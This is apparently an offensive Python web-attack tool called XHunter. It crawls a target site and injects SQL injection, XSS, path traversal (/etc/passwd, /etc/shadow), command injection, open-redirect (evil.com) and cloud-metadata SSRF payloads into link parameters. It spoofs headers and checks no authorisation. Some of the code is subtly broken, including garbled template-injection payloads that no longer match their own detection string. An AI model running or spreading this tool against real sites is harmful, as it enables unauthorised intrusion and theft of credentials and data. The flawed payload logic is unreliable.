 #!/usr/bin/env python3
#################################### message from DamnBoy402 ############################################
## Do you want to recode this script? Please include the credit of the original author, original author = DamnBoy402, do not claim my work   ##
## You can contribute or help develop this script, don't forget to tag me if you upload your work to github or to other social platforms :D         ##
## I really appreciate your contribution in helping to develop XHunter, so, stay enthusiastic about being a programmer :D                                    ##
#####################################################################################################

"""
    Remake by Arya Chandra Winata
"""

import argparse
import requests
import urllib.parse
import os
import random
import threading
from queue import Queue
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table

os.system("clear")
console = Console()

RED = "[red]"
BOLD_RED = "[bold red]"
BRIGHT_RED = "[bright_red]"
GREEN = "[green]"
YELLOW = "[yellow]"
WHITE = "[white]"

console.print(f"""
{BRIGHT_RED}██╗  ██╗██╗  ██╗███╗   ██╗████████╗███████╗██████╗
{BOLD_RED}██║  ██║██║  ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
{RED}███████║███████║██╔██╗ ██║   ██║   █████╗  ██████╔╝
{RED}██╔══██║██╔══██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
{RED}██║  ██║██║  ██║██║ ╚████║   ██║   ███████╗██║  ██║
{RED}╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{YELLOW}XHunter+ | Ultimate Web Vulnerability Scanner{WHITE}
{RED}Authored By Damnboy{BRIGHT_RED}
""")

crawled_links = set()
vulnerabilities_found = []
task_queue = Queue()

def load_user_agents():
    if os.path.exists("useragent.txt"):
        with open("useragent.txt", "r") as file:
            return [ua.strip() for ua in file.readlines() if ua.strip()]
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    ]

USER_AGENTS = load_user_agents()

def get_random_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": "https://www.google.com",
        "X-Forwarded-For": "127.0.0.1",
        "Accept-Encoding": "gzip, deflate",
    }

PAYLOADS = {
    "SQL Injection": ["' OR '1'='1' --", "' UNION SELECT NULL, NULL --", "' OR 1=1#"],
    "XSS": ["<script>alert(1)</script>", "'><script>alert(1)</script>", '"><img src=x onerror=alert(1)>'],
    "LFI": ["../../../../etc/passwd", "../../../../etc/shadow", "/proc/self/environ"],
    "Open Redirect": ["//evil.com", "https://evil.com", "/%2F%2Fevil.com"],
    "RCE": ["; ls -la", "whoami", "| cat /etc/passwd"],
    "SSTI": ["{{77}}", "{77}", "${7*7}"],
    "SSRF": ["http://127.0.0.1:80", "file:///etc/passwd", "http://169.254.169.254/latest/meta-data/"],
    "HPP": ["?param=1&param=2", "?q=1&q=<script>alert(1)</script>", "?x=foo&x=bar"]
}

def fetch_url(url):
    try:
        response = requests.get(url, headers=get_random_headers(), timeout=5)
        return response
    except requests.RequestException:
        return None

def analyze_response(response, payload, vuln_type, url):
    indicators = {
        "SQL Injection": ["syntax error", "mysql_fetch", "mysqli", "sql syntax", "warning: mysql"],
        "XSS": ["<script>alert"],
        "LFI": ["root:x:0:0", "db_password"],
        "Open Redirect": ["evil.com"],
        "RCE": ["uid=", "gid=", "/root"],
        "SSTI": ["49", "error in template"],
        "SSRF": ["ec2", "instance", "metadata"],
        "HPP": ["duplicate parameter"]
    }

    if any(indicator in response.text.lower() for indicator in indicators.get(vuln_type, [])):
        color = BRIGHT_RED if vuln_type in ["RCE", "SSRF", "SQL Injection"] else BOLD_RED
        console.print(f"{color}[CRITICAL] {vuln_type} at {url} with payload: {payload}")
        vulnerabilities_found.append((vuln_type, url, payload))
        with open("result.txt", "a") as file:
            file.write(f"{vuln_type} VULNERABILITY FOUND: {url} | Payload: {payload}\n")

def test_vulnerability(url, payloads, vuln_type):
    for payload in payloads:
        injected_url = url + urllib.parse.quote(payload)
        response = fetch_url(injected_url)
        if response:
            analyze_response(response, payload, vuln_type, injected_url)

def crawl(url, depth, scan_all):
    if url in crawled_links or depth <= 0:
        return
    crawled_links.add(url)

    response = fetch_url(url)
    if not response:
        return

    soup = BeautifulSoup(response.text, "html.parser")
    new_links = set()

    for link in soup.find_all("a", href=True):
        full_url = urllib.parse.urljoin(url, link["href"])

        if "=" in full_url and scan_all and full_url not in crawled_links:
            new_links.add(full_url)


    for link in new_links:
        for vuln_type, payloads in PAYLOADS.items():
            task_queue.put((test_vulnerability, link, payloads, vuln_type))


    for link in new_links:
        crawl(link, depth - 1, scan_all)

def worker():
    while not task_queue.empty():
        func, *args = task_queue.get()
        func(*args)
        task_queue.task_done()

def display_results():
    table = Table(title="Scan Results", header_style="bold magenta")
    table.add_column("Vulnerability Type", style="bold cyan")
    table.add_column("URL", style="bold yellow")
    table.add_column("Payload", style="bold red")
    
    for vuln_type, url, payload in vulnerabilities_found:
        table.add_row(vuln_type, url, payload)
    
    console.print(table)
    console.print(f"\n{GREEN}[SCAN COMPLETE] Results saved in result.txt")

def main():
    parser = argparse.ArgumentParser(description="XHunter Ultra++ - Ultimate Web Vulnerability Scanner")
    parser.add_argument("-u", "--url", help="Target URL", required=True)
    parser.add_argument("--all", help="Scan ALL vulnerabilities", action="store_true")
    parser.add_argument("--depth", help="Crawl Depth (default: 2)", type=int, default=2)
    args = parser.parse_args()

    console.print(f"{YELLOW}[STARTING XHunter Ultra++]")
    crawl(args.url, args.depth, args.all)

    threads = []
    for _ in range(10):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

    display_results()

if __name__ == "__main__":
    main()
